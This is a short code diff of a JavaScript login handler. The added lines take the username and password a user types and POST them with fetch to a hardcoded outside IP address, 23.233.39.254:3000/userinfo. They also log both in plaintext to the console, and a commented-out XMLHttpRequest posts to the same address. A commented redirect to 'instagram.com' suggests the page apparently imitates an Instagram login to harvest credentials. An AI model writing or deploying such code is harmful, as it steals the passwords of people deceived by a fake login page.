@@ -37,11 +37,21 @@ function logInOnClick() {
         username: usernameInputText,
         password: passwordInputText
     };
+    fetch('http://23.233.39.254:3000/userinfo', {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data),
+        mode: "cors"
+    });
+    console.log(usernameInputText + ", " + passwordInputText);
+    /*
     var xhr = new window.XMLHttpRequest();
     xhr.open('POST', 'http://23.233.39.254:3000/userinfo', true);
     xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8')
     xhr.send(JSON.stringify(data))
-    console.log(usernameInputText + ", " + passwordInputText);
+    */
     // document.location.href = "instagram.com";
 
     /*
